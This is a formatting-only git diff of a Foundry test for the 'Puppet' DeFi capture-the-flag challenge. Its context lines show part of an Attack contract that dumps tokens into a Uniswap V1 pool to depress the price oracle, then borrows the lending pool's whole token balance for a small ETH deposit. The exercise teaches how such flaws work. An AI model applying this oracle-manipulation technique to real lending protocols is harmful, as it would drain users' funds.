@@ -43,7 +43,8 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate =
+            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
 
         // Deploy factory, initializing it with the address of the template exchange
         uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
@@ -79,7 +80,10 @@ contract PuppetChallenge is Test {
         assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
         assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
         assertEq(uniswapV1Exchange.tokenAddress(), address(token));
-        assertEq(uniswapV1Exchange.getTokenToEthInputPrice(1e18), _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE));
+        assertEq(
+            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
+            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+        );
         assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
         assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
     }
@@ -93,12 +97,15 @@ contract PuppetChallenge is Test {
         token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
         console.log("player ETH balance", player.balance);
         attack.attack();
-        console.log("player ETH balance", player.balance /1e18);
-
+        console.log("player ETH balance", player.balance / 1e18);
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve) private pure returns (uint256) {
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
         return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
     }
 
@@ -134,10 +141,10 @@ contract Attack {
 
         token.approve(address(uniswapV1Exchange), initialTokenBalance);
         uniswapV1Exchange.tokenToEthTransferInput(initialTokenBalance, 9e18, block.timestamp, address(this));
-        
+
         uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
         require(address(this).balance >= depositRequired, "Attack contract doesn't have enough ETH for deposit");
-        
+
         lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, address(recovery));
         uint256 attackETHBalance = address(this).balance;
         (bool s,) = msg.sender.call{value: attackETHBalance}("");
